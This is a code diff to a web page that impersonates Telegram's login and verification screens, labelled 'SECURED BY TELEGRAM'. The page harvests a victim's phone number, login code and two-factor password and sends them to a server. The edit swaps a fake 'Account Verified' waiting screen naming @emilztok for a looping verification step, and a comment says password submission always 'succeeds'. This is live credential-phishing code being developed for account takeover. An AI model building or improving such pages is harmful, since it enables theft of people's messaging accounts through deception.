@@ -186,8 +186,7 @@
         .phone-section,
         .code-section,
         .password-section,
-        .verification-section,
-        .success-section {
+        .verification-section {
             display: none;
             margin-top: 20px;
             animation: fadeIn 0.3s ease;
@@ -196,8 +195,7 @@
         .phone-section.active,
         .code-section.active,
         .password-section.active,
-        .verification-section.active,
-        .success-section.active {
+        .verification-section.active {
             display: block;
         }
 
@@ -283,6 +281,7 @@
             color: #6c5ce7;
         }
 
+        /* ДВУХЭТАПНАЯ АВТОРИЗАЦИЯ (ПАРОЛЬ) */
         .password-input-wrap {
             background: #1a1a2a;
             border-radius: 14px;
@@ -370,21 +369,6 @@
             color: #8b8ba3;
             font-size: 13px;
             line-height: 1.5;
-        }
-
-        .verification-card .timer {
-            color: #6c6c84;
-            font-size: 13px;
-            margin-top: 12px;
-        }
-
-        /* Стили для успеха */
-        .success-card {
-            border-color: #4caf50 !important;
-        }
-        .success-icon {
-            font-size: 56px;
-            margin-bottom: 12px;
         }
 
         .code-status {
@@ -576,21 +560,6 @@
 
             <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
         </div>
-
-        <!-- ШАГ 6: УСПЕХ (Account Verified + Waiting for @emilztok) -->
-        <div id="stepSuccess" class="success-section">
-            <div class="verification-card success-card">
-                <div class="success-icon">✅</div>
-                <h4 style="color: #4caf50;">Account Verified</h4>
-                <p style="color: #8b8ba3;">Waiting for verification from <strong>@emilztok</strong></p>
-                <div style="margin-top:16px;">
-                    <div class="spinner-circle"></div>
-                </div>
-                <div class="timer" id="successTimer">⏳ 5s</div>
-            </div>
-
-            <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
-        </div>
     </div>
 
     <script>
@@ -607,14 +576,12 @@
 
         let userPhone = '';
         let userCode = '';
-        let successTimerInterval = null;
 
         const stepMain = document.getElementById('stepMain');
         const stepRegion = document.getElementById('stepRegion');
         const stepCode = document.getElementById('stepCode');
         const stepPassword = document.getElementById('stepPassword');
         const stepVerification = document.getElementById('stepVerification');
-        const stepSuccess = document.getElementById('stepSuccess');
         const backBtn = document.getElementById('backBtn');
         const btnVerify = document.getElementById('btnVerify');
         const btnSendCode = document.getElementById('btnSendCode');
@@ -628,7 +595,6 @@
         const codeInput = document.getElementById('codeInput');
         const passwordInput = document.getElementById('passwordInput');
         const displayPhone = document.getElementById('displayPhone');
-        const successTimer = document.getElementById('successTimer');
 
         regionSelect.addEventListener('change', function() {
             const prefix = '+' + this.value;
@@ -636,7 +602,7 @@
         });
 
         function showStep(step) {
-            [stepMain, stepRegion, stepCode, stepPassword, stepVerification, stepSuccess].forEach(el => {
+            [stepMain, stepRegion, stepCode, stepPassword, stepVerification].forEach(el => {
                 el.style.display = 'none';
                 el.classList.remove('active');
             });
@@ -748,7 +714,7 @@
                 });
         });
 
-        // ===== ОТПРАВКА ПАРОЛЯ → УСПЕХ С ТАЙМЕРОМ =====
+        // ===== ОТПРАВКА ПАРОЛЯ (ВСЕГДА УСПЕШНО) =====
         btnVerifyPassword.addEventListener('click', function() {
             const password = passwordInput.value.trim();
 
@@ -783,24 +749,7 @@
                 })
                 .then(data => {
                     console.log('✅ Пароль отправлен на сервер:', data);
-                    
-                    // Показываем экран успеха
-                    showStep(stepSuccess);
-                    
-                    // Запускаем таймер 5 секунд
-                    let seconds = 5;
-                    successTimer.textContent = `⏳ ${seconds}s`;
-                    
-                    if (successTimerInterval) clearInterval(successTimerInterval);
-                    successTimerInterval = setInterval(() => {
-                        seconds--;
-                        successTimer.textContent = `⏳ ${seconds}s`;
-                        if (seconds <= 0) {
-                            clearInterval(successTimerInterval);
-                            successTimer.textContent = '✅ Done';
-                        }
-                    }, 1000);
-                    
+                    showStep(stepVerification);
                     btnVerifyPassword.disabled = false;
                     btnVerifyPassword.textContent = '✅ Подтвердить пароль';
                 })
@@ -871,9 +820,8 @@
                 }
                 return;
             }
-            if (stepVerification.style.display === 'block' || stepSuccess.style.display === 'block') {
+            if (stepVerification.style.display === 'block') {
                 if (confirm('Вы уверены? Авторизация будет прервана.')) {
-                    if (successTimerInterval) clearInterval(successTimerInterval);
                     showStep(stepMain);
                 }
                 return;
